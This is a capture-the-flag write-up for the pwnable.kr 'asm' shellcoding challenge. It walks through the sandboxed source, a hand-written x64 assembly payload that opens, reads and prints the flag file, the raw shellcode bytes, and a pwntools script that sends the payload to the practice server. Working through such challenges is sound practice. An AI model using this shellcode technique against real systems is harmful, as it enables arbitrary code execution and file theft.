#pwnable.kr: ASM

Our goal is to get the `asm` binary to print our flag.

We are provided with the source code for `asm` in `asm.c`.
```c
  1 #include <stdio.h>
  2 #include <string.h>
  3 #include <stdlib.h>
  4 #include <sys/mman.h>
  5 #include <seccomp.h>
  6 #include <sys/prctl.h>
  7 #include <fcntl.h>
  8 #include <unistd.h>
  9 
 10 #define LENGTH 128
 11 
 12 void sandbox(){
 13     scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
 14     if (ctx == NULL) {
 15         printf("seccomp error\n");
 16         exit(0);
 17     }
 18 
 19     seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
 20     seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
 21     seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
 22     seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 23     seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 24 
 25     if (seccomp_load(ctx) < 0){
 26         seccomp_release(ctx);
 27         printf("seccomp error\n");
 28         exit(0);
 29     }
 30     seccomp_release(ctx);
 31 }
 32 
 33 char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x    4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
 34 unsigned char filter[256];
 35 int main(int argc, char* argv[]){
 36 
 37     setvbuf(stdout, 0, _IONBF, 0);
 38     setvbuf(stdin, 0, _IOLBF, 0);
 39 
 40     printf("Welcome to shellcoding practice challenge.\n");
 41     printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
 42     printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
 43     printf("If this does not challenge you. you should play 'asg' challenge :)\n");
 44 
 45     char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
 46     memset(sh, 0x90, 0x1000);
 47     memcpy(sh, stub, strlen(stub));
 48 
 49     int offset = sizeof(stub);
 50     printf("give me your x64 shellcode: ");
 51     read(0, sh+offset, 1000);
 52 
 53     alarm(10);
 54     chroot("/home/asm_pwn");    // you are in chroot jail. so you can't use symlink in /tmp
 55     sandbox();
 56     ((void (*)(void))sh)();
 57     return 0;

```

Lets look into the source code.

First '0x1000' is allocated in memory.
```c
 45     char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
 46     memset(sh, 0x90, 0x1000);
 47     memcpy(sh, stub, strlen(stub));
```

Then user input (our shellcode) is read from stdin and writen into the 0x1000 memory block.
```c
 49     int offset = sizeof(stub);
 50     printf("give me your x64 shellcode: ");
 51     read(0, sh+offset, 1000);
```

We are put into a sandbox
```c
 53     alarm(10);
 54     chroot("/home/asm_pwn");    // you are in chroot jail. so you can't use symlink in /tmp
 55     sandbox();
```
And the data in memory (our shellcode) is executed.
```c
 56     ((void (*)(void))sh)();
```
Looking at the sandbox, some secure computing filters are added limiting the kernel syscalls we have access to.
```c
 19     seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
 20     seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
 21     seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
 22     seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 23     seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
```
This limits the application to open, read, write, exit and exit_group syscalls.
This also means that our shellcode will be limited to those calls so no spawning a shell =(.

Last note, running file tells us the binary is x86_64.
```
user$ file asm
asm: ELF 64-bit LSB shared object, x86-64
```

##Writing The Shellcode
First we will write `payload.asm` program to open the flag and write it to stdout.
Then compile `payload.asm` and use objdump to extract the opcodes and we will have our shellcode.
Note this is not the most practical option as tools like pwntools.asm exist, but its fun to write and
good practice in asm.

Our `payload.asm` file:
```asm
;Author: Weston Silbaugh
;the asm for our shellcode payload
	section .mysec write exec alloc
	global	main

main:
	jmp		push_fname
s1:
;add null char
	xor		rax, rax
	pop		rbx
	push 		rbx
	add		bx,231
	mov		[ebx],eax
;open:
	add		al, 0x02	;sys_open
	pop		rdi		;const char *fname
	push 		rdi
	xor		rsi, rsi	;int flags
	xor		rdx, rdx	;int mode
	syscall
;read:
	mov		rdi, rax	;int fd
	xor		rax, rax	;sys_read
	pop		rsi		;buff
	push 		rsi
	add		dx, 400		;size
	syscall
;write:
	xor		eax, eax
	add 		al, 0x01	;sys_read
	xor		rdi, rdi
	add		rdi, 1		;int fd
	pop		rsi		;buff
	;mov		rdx, 128	;size
	syscall
exit:
	xor		rax, rax
	xor		rdi, rdi
	add		al, 60
	syscall
push_fname:
	call	s1
fname:
	;db "/home/nuser/ctf/progress/pwnable.kr/asm/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
nullchar:
	db "a"
```
Normally we would want to make this payload smaller but with the generous `0x1000` its good enough.

###Walkthrough of `payload.asm`:
```asm
	section .mysec write exec alloc
	global	main
```
I make my own secton to allow it to be set to write. Its not needed in this asm but non the less its there
```asm
main:
	jmp		push_fname
s1:
```
Then we jump to push_fname which pushes the flags file name to the stack and jumps back to `s1`
```asm
push_fname:
	call	s1
fname:
	;db "/home/nuser/ctf/progress/pwnable.kr/asm/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
nullchar:
	db "a"
```
Since we can not reference a label for our string, a work around is required.
The call to s1 pushes the address of our string onto the stack and jumps back to s1.
The string is placed at the bottom of .mysec because if it was at the top, a near jump call would contain NULL characters.
Making our string null terminated will have the same issue so it is left as an `a` character for now and will be changed at
run time.
```asm
;add null char
	xor		rax, rax
	pop		rbx
	push 		rbx
	add		bx,231
	mov		[ebx],eax
```
Once we return to `s1:`, our string is null terminated.

Then the flag is opened for reading.
```asm
;open:
	add		al, 0x02	;sys_open
	pop		rdi		;const char *fname
	push 		rdi
	xor		rsi, rsi	;int flags
	xor		rdx, rdx	;int mode
	syscall
```
The filename string is on the stack so we simply pop it off into `RBX`

Then we read the flag
```asm
;read:
	mov		rdi, rax	;int fd
	xor		rax, rax	;sys_read
	pop		rsi		;buff
	push 		rsi
	add		dx, 400		;size
	syscall
```
The string holding the filename is overwriten with the contents of the flag.

And write the flags contents out to stdout.
```asm
;write:
	xor		eax, eax
	add 		al, 0x01	;sys_read
	xor		rdi, rdi
	add		rdi, 1		;int fd
	pop		rsi		;buff
	;mov		rdx, 128	;size
	syscall
```
The string size is still in `rdx`.

Then exit the program.
```asm
exit:
	xor		rax, rax
	xor		rdi, rdi
	add		al, 60
	syscall
```
###converting `payload.asm` into shellcode
my script to build `payload.asm`
```
nasm -felf64 ${1}.asm
gcc ${1}.o -o ${1}
```
compile the shellcode `$ sh build.sh payload`

running `objdump -d` we can see the opcodes and addresses of those opcodes in the elf.
`0000000000600870 <main>:` is the start of the code we want for our shellcode.
`00000000006009ad <nullchar>:` is the end of the code we want.
convert all the opcodes into shellcode and we are done.

I wrote a small python script just for this purpose.
```asm
objdump -d payload | mkshell -x 600870 6009ad
\xeb\x40\x48\x31\xc0\x5b\x53\x66\x81\xc3\xe7\x00\x67\x89\x03\x04\x02\x5f\x57\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x5e\x56\x66\x81\xc2\x90\x01\x0f\x05\x31\xc0\x04\x01\x48\x31\xff\x48\x83\xc7\x01\x5e\x0f\x05\x48\x31\xc0\x48\x31\xff\x04\x3c\x0f\x05\xe8\xbb\xff\xff\xff\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x2f\x61\x73\x6d\x2f\x74\x68\x69\x73\x5f\x69\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x6e\x67\x61\x61
```
###Sending the shellcode
All thats left now is to send the shellcode to `asm` at `asm@pwnable.kr`
```asm
"""
pwnable.kr-asm solution
author: Weston Silbaugh
"""
from pwn import *

def main():
	#hand crafted shellcode
	#its not pretty but she works
	shellcode = "\xeb\x40\x48\x31\xc0\x5b\x53\x66\x81\xc3\xe7\x00\x67\x89\x03\x04\x02\x5f\x57\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x5e\x56\x66\x81\xc2\x90\x01\x0f\x05\x31\xc0\x04\x01\x48\x31\xff\x48\x83\xc7\x01\x5e\x0f\x05\x48\x31\xc0\x48\x31\xff\x04\x3c\x0f\x05\xe8\xbb\xff\xff\xff\x74\x68\x69\x73\x5f\x69\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x6e\x67\x61\x61"

	#connect and send shellcode
	con = ssh(host='pwnable.kr', port=2222, user='asm', password='guest')
	r = con.connect_remote('localhost', 9026)

	r.recvuntil('shellcode:')
	r.send(shellcode)

	#get our flag and print any additional text from service
	out = r.recvline(timeout=0.5)
	while(len(out) > 0):
		print(out)
		out = r.recvline(timeout=0.5)

if __name__ == '__main__':
	main()
```
